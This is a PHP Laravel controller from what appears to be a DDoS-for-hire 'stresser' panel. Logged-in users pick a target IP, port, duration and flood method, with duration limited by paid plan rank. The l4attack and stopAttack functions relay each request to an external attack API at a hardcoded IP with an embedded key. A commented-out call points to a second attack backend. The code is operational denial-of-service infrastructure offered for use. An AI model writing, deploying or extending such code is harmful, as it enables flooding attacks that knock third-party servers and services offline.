<?php

namespace App\Http\Controllers;

use Carbon\Carbon;
use App\Models\attack;
use App\Models\method;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use App\Http\Controllers\planController;

class attackController extends Controller
{
    public function index()
    {
        attack::where('finished_at', '<', Carbon::now())->update(['state' => 0]);
        $methods = method::all();
        $attacks = attack::all()->where('launcher_id', Auth::user()->id);
        $attacks = $attacks->reverse();
        return view('dashboard.attack', ['methods' => $methods], ['attacks' => $attacks]);
    }

    public function updateState($id)
    {
        $attack = attack::find($id);
        $attack->state = 0;
        $attack->save()->when($attack->finished_at)->isPast();
    }

    public function l4attack(Request $request)
    {
        $request->validate([
            'ip' => ['required', 'ipv4'],
            'port' => ['required', 'integer'],
            'length' => ['required', 'integer', planController::check(Auth::user()->rank)],
            'method' => ['required', 'string']
        ]);

        $client = new Client();
        // $client->request('POST', 'http://77.83.247.18/speed.php', [
        //     'form_params' => [
        //         'host' => $request->ip,
        //         'port' => $request->port,
        //         'time' => $request->length,
        //         'method' => $request->method
        //     ]
        // ]);

        $url = curl_init();
        curl_setopt($url, CURLOPT_URL,'http://89.171.139.72/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method='.$request->method.'&key=wyBd2fri35');
        curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
        curl_exec($url);
        curl_close($url);
        
        attack::create(['ip' => $request->ip, 'port' => $request->port, 'length' => $request->length, 'method' => $request->method,'launcher_id'=> Auth::user()->id, 'launched_at' => Carbon::now(), 'finished_at'=>Carbon::now()->addSecond($request->length)]);
        return redirect('/attack');
    }

    public function stopAttack(Request $request, $id)
    {
        $attack = attack::find($id);
        $attack->state = 0;
        $attack->save();
        $url = curl_init();
        curl_setopt($url, CURLOPT_URL,'http://89.171.139.72/api.php?'.'host='.$request->ip.'&port='.$request->port.'&time='.$request->length.'&method=STOP'.'&key=wyBd2fri35');
        curl_setopt($url, CURLOPT_RETURNTRANSFER, true);
        curl_exec($url);
        curl_close($url);
        return redirect('/attack');
    }
}
